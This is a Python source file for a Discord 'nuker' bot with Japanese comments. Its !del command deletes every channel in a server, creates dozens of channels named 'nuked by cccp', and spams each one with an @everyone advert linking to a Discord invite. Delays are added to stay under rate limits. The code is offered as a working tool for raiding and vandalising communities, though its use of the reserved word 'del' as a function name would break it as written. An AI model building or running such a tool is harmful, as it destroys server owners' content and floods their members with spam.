import discord
from discord.ext import commands
import asyncio
import os

# .envファイル不要。Railwayの「Environment」機能で変数を設定
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

宣伝文 = (
    "@everyone @here\n"
    "# CCCP ON TOP\n"
    "# [参加](https://discord.gg/ncUCZfJXRs)\n"
    "# [画像](https://imgur.com/NbBGFcf)\n"
    "# [画像](https://imgur.com/pY7EpwN)"
)

@bot.event
async def on_ready():
    print(f"✅ Bot ログイン成功: {bot.user}")

@bot.command()
async def del(ctx):
    guild = ctx.guild
    await ctx.message.delete()


    print("🔄 チャンネル削除中...")
    delete_tasks = [asyncio.create_task(ch.delete()) for ch in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    print("➕ チャンネル作成中...")
    new_channels = []
    for i in range(0, 60, 15):
        tasks = [
            asyncio.create_task(guild.create_text_channel("nuked by cccp"))
            for _ in range(15)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, discord.TextChannel):
                new_channels.append(r)
        await asyncio.sleep(1)  # レート制限対策

    print("📢 メッセージスパム開始...")
    async def spam(ch):
        for _ in range(50):
            try:
                await ch.send(宣伝文)
                await asyncio.sleep(0.5)
            except:
                await asyncio.sleep(2)

    await asyncio.gather(*(spam(ch) for ch in new_channels))
    print("✅ nuke 完了！")

bot.run(TOKEN)
import time

while True:
    time.sleep(10)
